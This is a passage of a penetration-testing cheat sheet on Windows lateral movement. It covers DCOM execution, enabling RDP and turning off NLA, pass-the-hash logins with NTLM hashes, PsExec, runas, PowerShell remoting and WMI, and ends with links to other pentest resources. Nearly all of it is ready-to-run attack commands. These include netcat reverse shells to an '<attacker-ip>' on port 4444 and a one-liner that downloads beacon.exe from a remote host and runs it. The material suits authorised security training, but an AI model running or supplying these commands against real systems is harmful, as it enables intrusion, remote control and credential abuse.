# Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
python dcomexec.py DOMAIN/username:password@10.10.10.10
```
## RDP
Enable Rdp on the server:
```
# Enable RDP
 reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
# Alternative
psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0

# Fix CredSSP errors
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Disable NLA
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
(Get-WmiObject -class "**Win32_TSGeneralSetting**" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
```
Connect from kali:
```
# Using cme
crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable

# Using rdesktop (sharing a local folder during a remote desktop session with -r)
rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare

# Using freerdp
xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing
# Pth need an admin account not in the "Remote Desktop Users" group (works for Server 2012 R2 / Win 8.1+ and require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11)
xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d 

# Sharprdp
SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
```
## PsExec (Sysinternal)
```
# Connect to remote system
PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
# switch admin user to NT Authority/System on the remote system 
PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s 
# switch from local administrato to NT SYSTEM locally
PsExec.exe -i -s cmd.exe
```
## Runas
 ```
runas /netonly /user:DOMAIN\username "cmd.exe"
runas /noprofil /netonly /user:DOMAIN\username cmd.exe
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"

C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"

$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```
## Powershell
Remote code execution with PS Credentials:
```
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```
Powershell remoting:
```
#Enable Powershell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting
#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -NAME <NameOfSession> -ComputerName <NameOfComputer>
Enter-PSSession -Sessions <NameOfSession> or -ComputerName <NameOfComputer>
[DC01]: PS>
```
Remote stateful commands:
```
# Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>
# Execute command
Invoke-Command -ComputerName <NameOfComputer> -ScriptBlock {whoami}
# Execute script
Invoke-Command -computername <NameOfComputer> -filePath c:\Scripts\Task.ps1
```
If problems occurs specify the session:
```
# Execute command on the session and stock the result
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
# Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```
Import a powershell module and execute its functions remotely:
``` 
#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess 

#Interact with the session
Enter-PSSession -Session $sess
```
Donwnload and execute exploit remotely in one line:
```
Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri 'http://10.10.10.10/beacon.exe' -OutFile 'C:\Temp\beacon.exe'; Start-Process -wait C:\Temp\beacon.exe}
```
## WMI
```
wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
```
## Netuse
```
net use \\ordws01.cscou.lab /user:DOMAIN\username password C$
```
# Ressources

[Pentest-Cheatsheets/file-transfers.rst at master · Tib3rius/Pentest-Cheatsheets (github.com)](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/windows/file-transfers.rst)
[Pentest-Cheatsheets/useful-commands.rst at master · Tib3rius/Pentest-Cheatsheets (github.com)](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/windows/useful-commands.rst)
[Pentest-Cheatsheets/powershell.rst at master · Tib3rius/Pentest-Cheatsheets (github.com)](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/windows/powershell.rst)
[PayloadsAllTheThings/Windows - Using credentials.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md)
[Tib3rius/Active-Directory-Exploitation-Cheat-Sheet: A cheat sheet that contains common enumeration and attack methods for Windows Active Directory. (github.com)](https://github.com/Tib3rius/Active-Directory-Exploitation-Cheat-Sheet#lateral-movement)

[PayloadsAllTheThings/Windows - Download and Execute.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)

[Compiling the Exploit - OSCP Notes (gitbook.io)](https://gabb4r.gitbook.io/oscp-notes/exploitaion/compiling-the-exploit)
[msfvenom - OSCP Notes (gitbook.io)](https://gabb4r.gitbook.io/oscp-notes/shell/msfvenom)

[Transfering files on Windows · Total OSCP Guide (gitbooks.io)](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)

[Get Reverse-shell via Windows one-liner – Hacking Articles](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
